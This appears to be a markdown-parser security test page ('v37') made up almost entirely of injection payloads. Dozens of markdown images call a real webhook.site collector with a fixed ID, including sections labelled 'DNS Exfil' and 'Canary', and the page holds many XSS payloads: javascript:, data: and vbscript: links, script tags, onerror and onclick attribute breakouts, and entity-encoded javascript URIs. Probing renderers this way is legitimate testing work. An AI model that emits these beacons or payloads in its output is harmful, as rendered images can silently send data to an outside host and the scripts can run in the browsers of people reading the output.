# Security Research - v37

## Markdown-Specific Edge Cases & Escaping

Testing markdown parser vulnerabilities and escaping edge cases.

---

### 1) Markdown Image in HTML Attribute

<a href="![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/md-in-href.gif)">Markdown img in href</a>

<div title="![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/md-in-title.gif)">Markdown img in title</div>

---

### 2) Escape Sequence Breaking

\![not-image](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/escape1.gif)

!\[broken](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/escape2.gif)

![test\](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/escape3.gif)

![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/escape4.gif\)

---

### 3) Reference-Style Links with Injection

[normal-ref]: https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/ref-normal.gif

![ref-img][normal-ref]

[inject-ref]: javascript:alert(1)

[Try inject ref][inject-ref]

[data-ref]: data:text/html,<script>alert(1)</script>

[Try data ref][data-ref]

---

### 4) Nested Markdown Structures

[![nested-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/nested-img.gif)](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/nested-link)

[![double-nest](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/double-nest.gif)](javascript:alert(1))

---

### 5) URL-Encoded Markdown Chars

![%5B%5D](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/url-encoded-brackets.gif)

![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/%21%5Binjected%5D%28evil%29.gif)

---

### 6) Markdown in Fenced Code Block Injection

```
![should-not-render](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/in-code-block.gif)
```

```html
<img src="https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/in-html-code.gif">
```

---

### 7) Incomplete/Malformed Markdown

![](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/empty-alt.gif)

![ ](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/space-alt.gif)

![test](

![test]()

![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/valid-after-malformed.gif)

---

### 8) Unicode in Image Alt/URL

![🔥💀](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/emoji-alt.gif)

![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/tëst-üñîcödé.gif)

---

### 9) Whitespace Variations in Markdown

![test](   https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/leading-space.gif)

![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/trailing-space.gif   )

![test](	https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/tab.gif)

![test](
https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/newline.gif
)

---

### 10) Markdown Link Title Injection

![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/title1.gif "Normal title")

![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/title2.gif "onclick=alert(1)")

![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/title3.gif "" onclick="alert(1)")

![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/title4.gif ')><img src=x onerror=alert(1)>')

---

### 11) Autolink Protocol Abuse

<javascript:alert(1)>

<data:text/html,<script>alert(1)</script>>

<vbscript:alert(1)>

<https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/autolink.gif>

---

### 12) Task List XSS

- [ ] <script>alert('task')</script>
- [x] <img src="https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/task-img.gif">
- [ ] [task link](javascript:alert(1))

---

### 13) Blockquote Injection

> <script>alert('quote')</script>
> ![quote-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/quote-img.gif)

---

### 14) Table Cell XSS

| Header | Test |
|--------|------|
| <script>alert(1)</script> | normal |
| ![table-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/table-img.gif) | test |
| [link](javascript:alert(1)) | js link |

---

### 15) Footnote Injection

This has a footnote[^1].

[^1]: <script>alert('footnote')</script> ![footnote-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/footnote-img.gif)

---

### 16) Definition List (if supported)

Term
: <script>alert('def')</script>
: ![def-img](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/def-img.gif)

---

### 17) HTML Entity in Markdown

![test](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/entity&#x2d;dash.gif)

![test](&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1))

---

### DNS Exfil

![dns](https://v37-dns.d5f00a91-9c8e-4765-a71b-87f5503a7d03.dnshook.site/dns.gif)

### Canary

![canary](https://webhook.site/d5f00a91-9c8e-4765-a71b-87f5503a7d03/v37-canary.gif)

---

*v37 - Markdown-specific edge cases & escaping*
